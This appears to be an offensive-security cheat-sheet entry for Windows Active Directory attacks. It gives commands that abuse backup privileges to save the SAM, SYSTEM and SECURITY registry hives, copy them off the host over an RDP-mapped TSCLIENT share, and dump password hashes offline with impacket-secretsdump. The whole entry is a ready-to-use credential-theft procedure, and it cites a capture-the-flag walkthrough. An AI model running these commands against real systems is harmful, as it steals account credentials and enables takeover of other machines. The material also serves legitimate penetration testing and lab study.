---
title: SeBackup/SeRestore - SAM and System Hive Dump
category: ad
subcategory: ad-attacks
os: windows
command: reg save hklm\sam c:\Temp\sam
tools: reg, robocopy, impacket-secretsdump
---


### Save the hives (only local accounts, but no special tools needed)

```cmd
cd c:\
mkdir temp
cd temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

### Copy them out via TSCLIENT mapped drive

```cmd
copy sam,system \\TSCLIENT\share\
```

### Offline extraction

```bash
impacket-secretsdump -sam sam -system system local
```

### Full hive set including SECURITY (more credential material)

```cmd
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```

### Reference

https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f
